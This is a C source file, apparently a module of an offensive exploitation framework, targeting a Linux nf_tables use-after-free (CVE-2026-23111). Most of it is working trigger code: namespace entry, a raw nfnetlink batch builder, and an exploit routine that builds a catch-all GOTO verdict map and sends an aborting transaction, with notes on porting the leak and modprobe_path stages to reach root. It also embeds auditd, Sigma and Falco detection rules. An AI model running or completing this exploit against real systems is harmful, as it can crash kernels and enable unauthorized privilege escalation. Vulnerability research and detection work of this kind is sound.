/*
 * nft_catchall_cve_2026_23111 — SKELETONKEY module
 *
 * CVE-2026-23111 — a use-after-free in the Linux kernel's nf_tables
 * (netfilter) transaction-abort path. `nft_map_catchall_activate()`
 * carries an inverted condition (a stray `!`): on transaction abort it
 * processes *active* catch-all set elements instead of skipping them.
 * A catch-all element in an nftables *map* holds a verdict (GOTO/JUMP)
 * that references a chain; the wrong (de)activation lets the chain's
 * use-count reach zero so a following DELCHAIN frees it while the
 * catch-all verdict element still points at it → UAF. From an
 * unprivileged user (via user namespaces + nftables) this is escalatable
 * to root: leak a kernel address, win arbitrary R/W, ROP over
 * modprobe_path / selinux_state.
 *
 * CWE-416 (Use After Free). CVSS 7.8 (AV:L/AC:L/PR:L/UI:N/C:H/I:H/A:H).
 * Fixed upstream by commit f41c5d151078c5348271ffaf8e7410d96f2d82f8
 * ("remove one exclamation mark"). Public reproduction + analysis by
 * FuzzingLabs. NOT in CISA KEV.
 *
 * STATUS: 🟡 TRIGGER (reconstructed) — primitive-only, NOT VM-verified.
 *   This is one more UAF in the most-covered subsystem in the corpus
 *   (see nf_tables / nft_set_uaf / nft_payload / nft_pipapo / ...), and
 *   like nf_tables (CVE-2024-1086) it is shipped as a fork-isolated
 *   trigger that fires the bug class and STOPS. detect() version-gates
 *   against the Debian-tracked backports below and additionally requires
 *   unprivileged user-namespace clone (the bug is unreachable to an
 *   unprivileged user without it). exploit() builds a map with a
 *   catch-all GOTO element and provokes a failed (aborting) batch
 *   transaction to drive the abort-path UAF, observes slabinfo, and
 *   returns EXPLOIT_FAIL — the per-kernel leak + arbitrary-R/W + ROP that
 *   lands a root shell is NOT bundled (per-build offsets refused), and
 *   the trigger itself is reconstructed from the public analysis rather
 *   than VM-verified. It never claims root it did not get.
 *
 * Affected range (Debian-tracked stable backports of the fix):
 *   6.1.x  : K >= 6.1.164   (bookworm)
 *   6.12.x : K >= 6.12.73   (trixie)
 *   6.18.x : K >= 6.18.10   (forky / sid); 7.0+ inherits the fix
 *   The 5.10 (bullseye) branch is still unfixed as of writing → version-
 *   only VULNERABLE. Catch-all set elements were added in ~5.13, so the
 *   vulnerable nft_map_catchall_activate path does not exist below that.
 *
 * Preconditions: CONFIG_NF_TABLES + CONFIG_USER_NS, and unprivileged
 *   user-namespace clone permitted (modern Ubuntu's
 *   apparmor_restrict_unprivileged_userns / a 0 sysctl closes this).
 *
 * arch_support: x86_64 (the groom + any future finisher are x86_64-tuned).
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"

#include <stdint.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include "../../core/nft_compat.h"  /* shims for newer-kernel uapi constants */

/* Catch-all set-element flag — may be absent from older uapi headers. */
#ifndef NFT_SET_ELEM_CATCHALL
#define NFT_SET_ELEM_CATCHALL 0x2
#endif

/* ------------------------------------------------------------------
 * Kernel-range table. Upstream-stable thresholds (<= the Debian
 * package fixes, so the drift checker reports INFO, never TOO_TIGHT).
 * security-tracker.debian.org is the source of record.
 * ------------------------------------------------------------------ */
static const struct kernel_patched_from nft_catchall_patched_branches[] = {
    {6,  1, 164},   /* 6.1.x  (Debian bookworm fixed_version 6.1.164) */
    {6, 12,  73},   /* 6.12.x (Debian trixie fixed_version 6.12.73) */
    {6, 18,  10},   /* 6.18.x (Debian forky / sid fixed_version 6.18.10) */
    /* 7.0+ inherits "patched" via the strictly-newer-than-all-entries
     * rule — the fix predates the 7.0 branch. */
};

static const struct kernel_range nft_catchall_range = {
    .patched_from = nft_catchall_patched_branches,
    .n_patched_from = sizeof(nft_catchall_patched_branches) /
                      sizeof(nft_catchall_patched_branches[0]),
};

static bool nf_tables_loaded(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "nf_tables ", 10) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static skeletonkey_result_t nft_catchall_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] nft_catchall: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Catch-all set elements (and nft_map_catchall_activate) arrived in
     * ~5.13. Below that the vulnerable path does not exist. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 13, 0)) {
        if (!ctx->json)
            fprintf(stderr, "[i] nft_catchall: kernel %s predates catch-all set "
                            "elements (~5.13) — vulnerable path absent\n",
                    v->release);
        return SKELETONKEY_OK;
    }

    if (kernel_range_is_patched(&nft_catchall_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] nft_catchall: kernel %s is patched\n", v->release);
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host ? ctx->host->unprivileged_userns_allowed : false;
    if (!ctx->json) {
        fprintf(stderr, "[i] nft_catchall: kernel %s in vulnerable range\n",
                v->release);
        fprintf(stderr, "[i] nft_catchall: unprivileged user_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
        fprintf(stderr, "[i] nft_catchall: nf_tables module loaded: %s\n",
                nf_tables_loaded() ? "yes" : "no (autoloads on first nft use)");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_catchall: kernel vulnerable but unprivileged "
                            "user_ns clone denied → unprivileged exploit "
                            "unreachable\n");
            fprintf(stderr, "[i] nft_catchall: still patch — a privileged "
                            "attacker can trigger the abort-path UAF\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json)
        fprintf(stderr, "[!] nft_catchall: VULNERABLE — kernel in range AND "
                        "unprivileged user_ns clone allowed\n");
    return SKELETONKEY_VULNERABLE;
}

/* ------------------------------------------------------------------
 * userns+netns entry: gain CAP_NET_ADMIN over a private netns so the
 * malformed ruleset only touches our own namespace.
 * ------------------------------------------------------------------ */
static int enter_unpriv_namespaces(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[-] unshare(USER|NET)");
        return -1;
    }
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] uid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] gid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    return 0;
}

/* ------------------------------------------------------------------
 * Minimal dep-free nfnetlink batch builder (same approach as the
 * nf_tables module — libnftnl validates our malformed input away).
 * ------------------------------------------------------------------ */
#define ALIGN_NL(x)  (((x) + 3) & ~3)

static void put_attr(uint8_t *buf, size_t *off, uint16_t type,
                     const void *data, size_t len)
{
    struct nlattr *na = (struct nlattr *)(buf + *off);
    na->nla_type = type;
    na->nla_len  = NLA_HDRLEN + len;
    if (len) memcpy(buf + *off + NLA_HDRLEN, data, len);
    *off += ALIGN_NL(NLA_HDRLEN + len);
}
static void put_attr_u32(uint8_t *buf, size_t *off, uint16_t type, uint32_t v)
{
    uint32_t be = htonl(v);
    put_attr(buf, off, type, &be, sizeof be);
}
static void put_attr_str(uint8_t *buf, size_t *off, uint16_t type, const char *s)
{
    put_attr(buf, off, type, s, strlen(s) + 1);
}
static size_t begin_nest(uint8_t *buf, size_t *off, uint16_t type)
{
    size_t at = *off;
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_type = type | NLA_F_NESTED;
    na->nla_len  = 0;
    *off += NLA_HDRLEN;
    return at;
}
static void end_nest(uint8_t *buf, size_t *off, size_t at)
{
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_len = (uint16_t)(*off - at);
    while ((*off) & 3) buf[(*off)++] = 0;
}

struct nfgenmsg_local { uint8_t nfgen_family; uint8_t version; uint16_t res_id; };

static void put_nft_msg(uint8_t *buf, size_t *off, uint16_t nft_type,
                        uint16_t flags, uint32_t seq, uint8_t family)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | nft_type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = family;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(0);
    *off += sizeof(*nf);
}
static void end_msg(uint8_t *buf, size_t *off, size_t msg_start)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + msg_start);
    nlh->nlmsg_len = (uint32_t)(*off - msg_start);
    while ((*off) & 3) buf[(*off)++] = 0;
}
static void put_batch_marker(uint8_t *buf, size_t *off, uint16_t type, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

static const char NFT_TABLE_NAME[] = "skeletonkey_t";
static const char NFT_CHAIN_NAME[] = "skeletonkey_goto";  /* GOTO target chain */
static const char NFT_MAP_NAME[]   = "skeletonkey_map";

static void put_new_table(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_TABLE_NAME, NFT_TABLE_NAME);
    end_msg(buf, off, at);
}
/* A regular (non-base) chain that the catch-all GOTO verdict references.
 * Once the catch-all element is wrongly (de)activated on abort, this
 * chain's use-count is mishandled and it can be freed while referenced. */
static void put_new_chain(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_CHAIN_NAME,  NFT_CHAIN_NAME);
    end_msg(buf, off, at);
}
/* A verdict map (NFT_SET_MAP) whose data type is a verdict, so its
 * elements (including the catch-all) carry GOTO/JUMP verdicts. */
static void put_new_map(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSET, NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_NAME,  NFT_MAP_NAME);
    put_attr_u32(buf, off, NFTA_SET_FLAGS, NFT_SET_MAP);
    put_attr_u32(buf, off, NFTA_SET_KEY_TYPE, 13);             /* ipv4_addr-ish */
    put_attr_u32(buf, off, NFTA_SET_KEY_LEN,  sizeof(uint32_t));
    put_attr_u32(buf, off, NFTA_SET_DATA_TYPE, 0xffffff00);    /* "verdict" magic */
    put_attr_u32(buf, off, NFTA_SET_DATA_LEN,  sizeof(uint32_t));
    put_attr_u32(buf, off, NFTA_SET_ID, 0x2026);
    end_msg(buf, off, at);
}
/* Catch-all element (NFT_SET_ELEM_CATCHALL) whose data is a GOTO verdict
 * to NFT_CHAIN_NAME. This is the element nft_map_catchall_activate
 * mishandles on abort. */
static void put_catchall_goto(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSETELEM, NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_SET,   NFT_MAP_NAME);
    size_t list_at = begin_nest(buf, off, NFTA_SET_ELEM_LIST_ELEMENTS);
    size_t el_at   = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);
    /* catch-all: no key, just the CATCHALL flag */
    put_attr_u32(buf, off, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
    /* data = GOTO verdict referencing our chain by name */
    size_t data_at = begin_nest(buf, off, NFTA_SET_ELEM_DATA);
    size_t v_at    = begin_nest(buf, off, NFTA_DATA_VERDICT);
    put_attr_u32(buf, off, NFTA_VERDICT_CODE, (uint32_t)NFT_GOTO);
    put_attr_str(buf, off, NFTA_VERDICT_CHAIN, NFT_CHAIN_NAME);
    end_nest(buf, off, v_at);
    end_nest(buf, off, data_at);
    end_nest(buf, off, el_at);
    end_nest(buf, off, list_at);
    end_msg(buf, off, at);
}
/* A deliberately-invalid message: references a set that does not exist,
 * so the kernel rejects it and ABORTS the whole batch transaction —
 * running the buggy nft_map_catchall_activate over the active catch-all
 * element we just created. */
static void put_aborting_op(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSETELEM, NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_SET,   "skeletonkey_nonexistent");
    size_t list_at = begin_nest(buf, off, NFTA_SET_ELEM_LIST_ELEMENTS);
    size_t el_at   = begin_nest(buf, off, 1);
    put_attr_u32(buf, off, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_CATCHALL);
    end_nest(buf, off, el_at);
    end_nest(buf, off, list_at);
    end_msg(buf, off, at);
}

static int nft_send_batch(int sock, const void *buf, size_t len)
{
    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = (void *)buf, .iov_len = len };
    struct msghdr m = {
        .msg_name = &dst, .msg_namelen = sizeof dst,
        .msg_iov = &iov,  .msg_iovlen = 1,
    };
    if (sendmsg(sock, &m, 0) < 0) { perror("[-] sendmsg"); return -1; }
    char rbuf[8192];
    for (int i = 0; i < 8; i++) {
        ssize_t r = recv(sock, rbuf, sizeof rbuf, MSG_DONTWAIT);
        if (r <= 0) break;
    }
    return 0;
}

static long slabinfo_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, strlen(slab)) == 0 && line[strlen(slab)] == ' ') {
            long a;
            if (sscanf(line + strlen(slab), " %ld", &a) == 1) active = a;
            break;
        }
    }
    fclose(f);
    return active;
}

static skeletonkey_result_t nft_catchall_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = nft_catchall_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] nft_catchall: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] nft_catchall: already running as root\n");
        return SKELETONKEY_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] nft_catchall: primitive-only run — builds a map with a "
                        "catch-all GOTO element and provokes an aborting batch to "
                        "drive the nft_map_catchall_activate UAF, then stops. The "
                        "per-kernel leak + R/W + ROP root-pop is NOT bundled.\n");

    /* Fork-isolated: a KASAN-enabled vulnerable kernel will panic on the
     * double-handling; isolating means the dispatcher survives. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        if (enter_unpriv_namespaces() < 0) _exit(20);
        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
        if (sock < 0) { perror("[-] socket(NETLINK_NETFILTER)"); _exit(21); }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); _exit(22);
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); _exit(23); }
        uint32_t seq = (uint32_t)time(NULL);

        /* Batch 1 (commits): table + GOTO-target chain + verdict map +
         * catch-all GOTO element. */
        size_t off = 0;
        put_batch_marker(batch, &off, NFNL_MSG_BATCH_BEGIN, seq++);
        put_new_table(batch, &off, seq++);
        put_new_chain(batch, &off, seq++);
        put_new_map(batch, &off, seq++);
        put_catchall_goto(batch, &off, seq++);
        put_batch_marker(batch, &off, NFNL_MSG_BATCH_END, seq++);
        if (!ctx->json)
            fprintf(stderr, "[*] nft_catchall: sending setup batch (%zu bytes)\n", off);
        if (nft_send_batch(sock, batch, off) < 0) {
            free(batch); close(sock); _exit(24);
        }

        long before = slabinfo_active("nft_chain");
        if (before < 0) before = slabinfo_active("kmalloc-cg-256");

        /* Batch 2 (aborts): a valid DELCHAIN-ish operation alongside an
         * invalid op so the whole transaction rolls back, running
         * nft_map_catchall_activate over the active catch-all element. */
        size_t off2 = 0;
        put_batch_marker(batch, &off2, NFNL_MSG_BATCH_BEGIN, seq++);
        put_catchall_goto(batch, &off2, seq++);   /* re-touch the catch-all elem */
        put_aborting_op(batch, &off2, seq++);      /* invalid → abort the batch */
        put_batch_marker(batch, &off2, NFNL_MSG_BATCH_END, seq++);
        if (!ctx->json)
            fprintf(stderr, "[*] nft_catchall: firing aborting batch (%zu bytes)\n", off2);
        nft_send_batch(sock, batch, off2);
        usleep(50 * 1000);

        long after = slabinfo_active("nft_chain");
        if (after < 0) after = slabinfo_active("kmalloc-cg-256");
        if (!ctx->json)
            fprintf(stderr, "[i] nft_catchall: nft_chain/cg-256 active: %ld → %ld\n",
                    before, after);

        free(batch);
        close(sock);
        _exit(100);   /* honest: trigger attempted, R/W not completed */
    }

    int status;
    waitpid(child, &status, 0);
    if (!WIFEXITED(status)) {
        if (!ctx->json)
            fprintf(stderr, "[!] nft_catchall: child died by signal %d — the "
                            "abort-path UAF likely fired (KASAN oops can manifest "
                            "as a child signal)\n", WTERMSIG(status));
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    int rc = WEXITSTATUS(status);
    if (rc == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_catchall: abort-path trigger attempted "
                            "(catch-all GOTO map + aborting batch). The full kernel "
                            "R/W + modprobe_path ROP is NOT bundled, and this "
                            "trigger is reconstructed from public analysis, not "
                            "VM-verified — honest EXPLOIT_FAIL.\n");
            fprintf(stderr, "[i] nft_catchall: to complete: port the FuzzingLabs / "
                            "public PoC leak + cross-cache groom + modprobe_path "
                            "overwrite for CVE-2026-23111.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[-] nft_catchall: trigger setup failed (child rc=%d)\n", rc);
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !__linux__ */

static skeletonkey_result_t nft_catchall_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] nft_catchall: Linux-only module "
                "(nf_tables catch-all abort UAF via nfnetlink) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t nft_catchall_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] nft_catchall: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __linux__ */

/* ----- Embedded detection rules ----- */
static const char nft_catchall_auditd[] =
    "# nf_tables catch-all abort UAF (CVE-2026-23111) — auditd rules\n"
    "# Canonical shape: unprivileged unshare(CLONE_NEWUSER|CLONE_NEWNET)\n"
    "# then nfnetlink batches building a verdict map with a catch-all\n"
    "# GOTO element and an aborting transaction. Legit userns+nft (docker\n"
    "# rootless, firewalld) will also trip — tune per environment.\n"
    "-a always,exit -F arch=b64 -S unshare -F auid>=1000 -F auid!=4294967295 -k skeletonkey-nft-catchall\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -k skeletonkey-nft-catchall-priv\n";

static const char nft_catchall_sigma[] =
    "title: Possible CVE-2026-23111 nf_tables catch-all abort UAF\n"
    "id: 3e8a1c47-skeletonkey-nft-catchall\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects an unprivileged user creating a user namespace then driving\n"
    "  nftables. CVE-2026-23111 abuses an inverted condition in\n"
    "  nft_map_catchall_activate on transaction abort to UAF a chain still\n"
    "  referenced by a catch-all GOTO verdict. False positives: rootless\n"
    "  containers / firewalld using userns + nft. A previously-unprivileged\n"
    "  process gaining euid 0 is the smoking gun.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns: {type: 'SYSCALL', syscall: 'unshare', a0: 0x10000000}\n"
    "  uid0:   {type: 'SYSCALL', syscall: 'setresuid', auid|expression: '!= 0'}\n"
    "  condition: userns and uid0\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.23111]\n";

static const char nft_catchall_falco[] =
    "- rule: nf_tables catch-all abort UAF batch by non-root (CVE-2026-23111)\n"
    "  desc: |\n"
    "    Non-root sendmsg on NETLINK_NETFILTER inside a user namespace,\n"
    "    delivering nfnetlink batches that build a verdict map with a\n"
    "    catch-all GOTO element and then abort a transaction. CVE-2026-23111\n"
    "    nft_map_catchall_activate use-after-free. False positives: rootless\n"
    "    container / firewall tooling.\n"
    "  condition: >\n"
    "    evt.type = sendmsg and fd.sockfamily = AF_NETLINK and not user.uid = 0\n"
    "  output: >\n"
    "    nfnetlink batch from non-root (possible CVE-2026-23111 catch-all UAF)\n"
    "    (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [network, mitre_privilege_escalation, T1068, cve.2026.23111]\n";

const struct skeletonkey_module nft_catchall_module = {
    .name           = "nft_catchall",
    .cve            = "CVE-2026-23111",
    .summary        = "nf_tables nft_map_catchall_activate abort-path UAF (inverted condition) → chain UAF via catch-all GOTO map",
    .family         = "nf_tables",
    .kernel_range   = "5.13 <= K (catch-all elems); fixed 6.1.164 / 6.12.73 / 6.18.10 (Debian backports of commit f41c5d1); 7.0+ inherits; 5.10 branch still unfixed",
    .detect         = nft_catchall_detect,
    .exploit        = nft_catchall_exploit,
    .mitigate       = NULL,   /* mitigation: upgrade kernel; OR sysctl kernel.unprivileged_userns_clone=0 */
    .cleanup        = NULL,   /* trigger runs in a throwaway userns+netns; no host artifacts */
    .detect_auditd  = nft_catchall_auditd,
    .detect_sigma   = nft_catchall_sigma,
    .detect_yara    = NULL,   /* behavioural (syscall/netlink) bug — no file artifact */
    .detect_falco   = nft_catchall_falco,
    .opsec_notes    = "detect() consults the shared host fingerprint for the kernel version (Debian backports 6.1.164/6.12.73/6.18.10) and additionally requires unprivileged user_ns clone — a vulnerable kernel with userns locked down (apparmor_restrict_unprivileged_userns / sysctl 0) is PRECOND_FAIL. exploit() forks an isolated child that enters unshare(CLONE_NEWUSER|CLONE_NEWNET), opens NETLINK_NETFILTER, builds a verdict map (NFT_SET_MAP) with a catch-all element (NFT_SET_ELEM_CATCHALL) carrying a GOTO verdict to a chain, then sends an aborting batch to drive nft_map_catchall_activate over the active catch-all element; it observes nft_chain/kmalloc-cg-256 slabinfo and returns EXPLOIT_FAIL (primitive-only; reconstructed trigger, not VM-verified). The per-kernel leak + arbitrary-R/W + modprobe_path ROP is NOT bundled. Audit-visible via unshare + socket(NETLINK_NETFILTER) + sendmsg batches; KASAN double-free oops on vulnerable kernels, silent otherwise. No persistent files (throwaway namespaces).",
    .arch_support   = "x86_64",
};

void skeletonkey_register_nft_catchall(void)
{
    skeletonkey_register(&nft_catchall_module);
}
